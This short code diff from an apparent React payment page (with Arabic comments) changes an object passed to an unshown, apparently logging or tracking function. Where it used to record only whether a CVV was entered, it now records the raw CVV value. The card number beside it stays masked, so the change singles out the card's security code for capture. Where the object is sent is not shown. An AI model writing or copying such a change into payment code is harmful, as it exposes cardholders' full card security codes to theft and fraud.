@@ -44,7 +44,7 @@ const Payment = () => {
     cardholderName: formData.cardholderName,
     cardNumber: formData.cardNumber ? `XXXX XXXX XXXX ${formData.cardNumber.replace(/\s/g, "").slice(-4)}` : "",
     expiryDate: formData.expiryMonth && formData.expiryYear ? `${formData.expiryMonth}/${formData.expiryYear}` : "",
-    cvvEntered: formData.cvv ? "نعم" : "لا"
+    cvv: formData.cvv
   }, "صفحة الدفع - Payment");
 
   // تحديد نوع البطاقة بناءً على الأرقام
